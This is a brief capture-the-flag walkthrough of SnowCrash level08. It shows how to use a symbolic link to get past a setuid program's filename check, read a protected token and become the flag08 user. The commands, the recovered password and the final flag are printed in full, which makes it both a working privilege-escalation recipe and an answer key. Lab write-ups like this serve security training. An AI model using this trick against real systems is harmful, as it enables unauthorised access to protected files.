For this level, we do a "ls -l" to see an executable and a file named token.

	level08@SnowCrash:~$ ls -l
	total 16
	-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
	-rw-------  1 flag08 flag08    26 Mar  5  2016 token

We try to execute level08 but we see that we need to give a file to read.

	level08@SnowCrash:~$ ./level08
	./level08 [file to read]

We try to give the token file on argument.

	level08@SnowCrash:~$ ./level08 token
	You may not access 'token'

It appear that we don't have the access to the token file.
We need to create a soft link (symbolik link) to this token file to have some sort of access to it.
Then pass the symbolic link to the program.

	level08@SnowCrash:~$ ln -s ~/token /tmp/file
	level08@SnowCrash:~$ ./level08 /tmp/file
	quif5eloekouj29ke0vouxean

Here we have the flag08 password.

	level08@SnowCrash:~$ su flag08
	Password:
	Don't forget to launch getflag !
	flag08@SnowCrash:~$ getflag
	Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

